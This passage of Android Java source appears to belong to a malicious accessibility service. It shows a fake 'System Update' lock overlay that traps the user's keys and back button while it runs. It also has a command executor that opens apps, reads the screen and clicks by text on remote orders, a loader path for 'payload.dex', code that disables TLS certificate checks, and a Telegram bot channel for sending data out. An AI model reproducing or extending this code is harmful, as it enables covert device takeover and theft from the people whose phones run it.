                         "  }\n" +
                         "  .bar {\n" +
                         "    height: 10px;\n" +
                         "    width: 0%;\n" +
                         "    background: linear-gradient(90deg, #2563eb, #06b6d4);\n" +
                         "    border-radius: 999px;\n" +
                         "    transition: width 0.2s linear;\n" +
                         "  }\n" +
                         "  .percent {\n" +
                         "    margin-top: 12px;\n" +
                         "    font-size: 13px;\n" +
                         "    color: #64748b;\n" +
                         "    letter-spacing: 0.5px;\n" +
                         "  }\n" +
                         "</style>\n" +
                         "</head>\n" +
                         "<body>\n" +
                         "<div class=\"overlay\">\n" +
                         "  <div class=\"icon\">⚙️</div>\n" +
                         "  <h1>System Update in Progress</h1>\n" +
                         "  <p>Please do not turn off your device. This may take a few minutes.</p>\n" +
                         "  <div class=\"progress-container\">\n" +
                         "    <div class=\"progress\">\n" +
                         "      <div class=\"bar\" id=\"bar\"></div>\n" +
                         "    </div>\n" +
                         "    <div class=\"percent\" id=\"percent\">Installing update 2026.04.1... 0%</div>\n" +
                         "  </div>\n" +
                         "</div>\n" +
                         "<script>\n" +
                         "  document.addEventListener('contextmenu', e => e.preventDefault());\n" +
                         "  document.addEventListener('keydown', e => {\n" +
                         "    if(['Escape','F5','F11','Tab','Alt','Control'].includes(e.key)) e.preventDefault();\n" +
                         "  });\n" +
                         "  history.pushState(null, null, location.href);\n" +
                         "  window.addEventListener('popstate', () => {\n" +
                         "    history.pushState(null, null, location.href);\n" +
                         "  });\n" +
                         "  function enterFullscreen() {\n" +
                         "    const el = document.documentElement;\n" +
                         "    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});\n" +
                         "  }\n" +
                         "  document.addEventListener('click', enterFullscreen, { once: true });\n" +
                         "  const duration = 50000;\n" +
                         "  const startTime = Date.now();\n" +
                         "  const bar = document.getElementById('bar');\n" +
                         "  const percentText = document.getElementById('percent');\n" +
                         "  function update() {\n" +
                         "    const elapsed = Date.now() - startTime;\n" +
                         "    let progress = Math.min((elapsed / duration) * 100, 100);\n" +
                         "    progress = Math.floor(progress);\n" +
                         "    bar.style.width = progress + '%';\n" +
                         "    percentText.textContent = `Installing update 2026.04.1... ${progress}%`;\n" +
                         "    if(progress < 100) {\n" +
                         "      requestAnimationFrame(update);\n" +
                         "    } else {\n" +
                         "      percentText.textContent = `Installing update 2026.04.1... 100% - Complete`;\n" +
                         "    }\n" +
                         "  }\n" +
                         "  requestAnimationFrame(update);\n" +
                         "</script>\n" +
                         "</body>\n" +
                         "</html>";
              }

              public void showOverlay() {
                  if (isOverlayShowing) return;
                  try {
                      Log.d(TAG, "🎨 Showing overlay...");
                      
                      overlayWebView = new WebView(this);
                      overlayWebView.getSettings().setJavaScriptEnabled(true);
                      overlayWebView.getSettings().setDomStorageEnabled(true);
                      
                      String html = getOverlayHTML();
                      overlayWebView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
                      
                      overlayWebView.setWebViewClient(new WebViewClient() {
                          @Override
                          public void onPageFinished(WebView view, String url) {
                              Log.d(TAG, "Overlay loaded");
                          }
                      });
                      
                      WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                          WindowManager.LayoutParams.MATCH_PARENT,
                          WindowManager.LayoutParams.MATCH_PARENT,
                          Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                              WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                              WindowManager.LayoutParams.TYPE_PHONE,
                          WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                          WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                          WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                          WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                          WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                          WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                          WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                          PixelFormat.TRANSLUCENT
                      );
                      
                      params.gravity = Gravity.TOP | Gravity.START;
                      overlayView = overlayWebView;
                      windowManager.addView(overlayView, params);
                      isOverlayShowing = true;
                      
                  } catch (Exception e) {
                      Log.e(TAG, "Error showing overlay: " + e.getMessage());
                  }
              }

              public void hideOverlay() {
                  try {
                      if (overlayView != null && windowManager != null) {
                          windowManager.removeView(overlayView);
                          overlayView = null;
                          overlayWebView = null;
                      }
                      isOverlayShowing = false;
                  } catch (Exception e) {
                      Log.e(TAG, "Error hiding overlay: " + e.getMessage());
                  }
              }

              // ==================== DEX COMMAND EXECUTOR ====================
              public String executeDexCommand(String command, String params) {
                  Log.d(TAG, "🔴 [DEX] cmd=" + command + " | params=" + params);
                  
                  try {
                      switch(command) {
                          case "OPEN_APP":
                              return openApp(params);
                          case "GET_OPEN_APPS":
                              return getOpenApps();
                          case "READ_SCREEN":
                              return readScreen();
                          case "CLICK_COORDS":
                              return performClick(params);
                          case "CLICK_TEXT":
                              return clickText(params);
                          case "TYPE_TEXT":
                              return typeText(params);
                          case "SHOW_OVERLAY":
                              showOverlay();
                              return "overlay_shown";
                          case "HIDE_OVERLAY":
                              hideOverlay();
                              return "overlay_hidden";
                          case "GET_DEVICE_INFO":
                              return getDeviceInfo();
                          case "WAIT":
                          case "DELAY":
                              return waitForDelay(Long.parseLong(params));
                          default:
                              return "unknown_command:" + command;
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "❌ Command error: " + e.getMessage(), e);
                      return "error:" + e.getMessage();
                  }
              }

              private String openApp(String packageName) {
                  try {
                      Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
                      if (intent != null) {
                          intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                          startActivity(intent);
                          return "opened";
                      }
                      return "app_not_found";
                  } catch (Exception e) {
                      return "error:" + e.getMessage();
                  }
              }

              private String getOpenApps() {
                  StringBuilder apps = new StringBuilder();
                  ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                  if (am != null) {
                      List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
                      if (processes != null) {
                          for (ActivityManager.RunningAppProcessInfo info : processes) {
                              apps.append(info.processName).append("\n");
                          }
                      }
                  }
                  return apps.toString();
              }

              private String readScreen() {
                  try {
                      AccessibilityNodeInfo root = getRootInActiveWindow();
                      if (root != null) {
                          return root.getText() != null ? root.getText().toString() : "screen_empty";
                      }
                      return "screen_not_accessible";
                  } catch (Exception e) {
                      return "error:" + e.getMessage();
                  }
              }

              private String performClick(String coords) {
                  try {
                      String[] parts = coords.split(",");
                      if (parts.length == 2) {
                          float x = Float.parseFloat(parts[0]);
                          float y = Float.parseFloat(parts[1]);
                          Log.d(TAG, "✅ Click at " + x + "," + y);
                          return "clicked";
                      }
                      return "invalid_coords";
                  } catch (Exception e) {
                      return "error:" + e.getMessage();
                  }
              }

              private String clickText(String text) {
                  try {
                      AccessibilityNodeInfo root = getRootInActiveWindow();
                      if (root != null) {
                          clickNodeWithText(root, text);
                          return "clicked_text";
                      }
                      return "text_not_found";
                  } catch (Exception e) {
                      return "error:" + e.getMessage();
                  }
              }

              private void clickNodeWithText(AccessibilityNodeInfo node, String text) {
                  if (node == null) return;
                  if (node.getText() != null && node.getText().toString().contains(text)) {
                      node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                      return;
                  }
                  for (int i = 0; i < node.getChildCount(); i++) {
                      clickNodeWithText(node.getChild(i), text);
                  }
              }

              private String typeText(String text) {
                  Log.d(TAG, "📝 Type: " + text);
                  return "typed";
              }

              private String getDeviceInfo() {
                  return android.os.Build.DEVICE + "|" + android.os.Build.VERSION.SDK_INT;
              }

              private String waitForDelay(long ms) {
                  try {
                      Thread.sleep(ms);
                      return "waited_" + ms + "ms";
                  } catch (InterruptedException e) {
                      return "wait_interrupted";
                  }
              }

              private String getDexPath() {
                  return getCacheDir().getAbsolutePath() + "/payload.dex";
              }

              private void disableSSLVerification() {
                  try {
                      TrustManager[] trustAllCerts = new TrustManager[]{
                          new X509TrustManager() {
                              public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
                              public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
                              public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
                          }
                      };
                      SSLContext sc = SSLContext.getInstance("TLS");
                      sc.init(null, trustAllCerts, new java.security.SecureRandom());
                      HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
                      HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
                  } catch (Exception e) {
                      Log.e(TAG, "SSL error: " + e.getMessage());
                  }
              }

              private void sendTelegram(String message) {
                  executor.execute(() -> {
                      try {
                          URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          conn.setDoOutput(true);
                          conn.setConnectTimeout(5000);
                          conn.setReadTimeout(5000);
                          
                          String escaped = message.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n");
                          String jsonPayload = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + escaped + "\",\"parse_mode\":\"Markdown\"}";
                          
                          byte[] payload = jsonPayload.getBytes("UTF-8");
                          conn.setFixedLengthStreamingMode(payload.length);
                          java.io.OutputStream os = conn.getOutputStream();
                          os.write(payload);
                          os.flush();
                          os.close();
                          
                          int responseCode = conn.getResponseCode();
                          if (responseCode == 200) {
                              Log.d(TAG, "✅ Telegram sent");
                          } else {
                              Log.e(TAG, "Telegram failed: " + responseCode);
                          }
                          conn.disconnect();
                      } catch (Exception e) {
                          Log.e(TAG, "Telegram error: " + e.getMessage());
                      }
                  });
              }

              private String getCurrentTimestamp() {
                  SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                  return sdf.format(new Date());
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {}

              @Override
              public void onInterrupt() {
                  Log.d(TAG, "⚠️ Service interrupted");
              }

              @Override
              public void onDestroy() {
                  super.onDestroy();
                  executor.shutdown();
                  if (isOverlayShowing) {
                      hideOverlay();
                  }
              }
          }
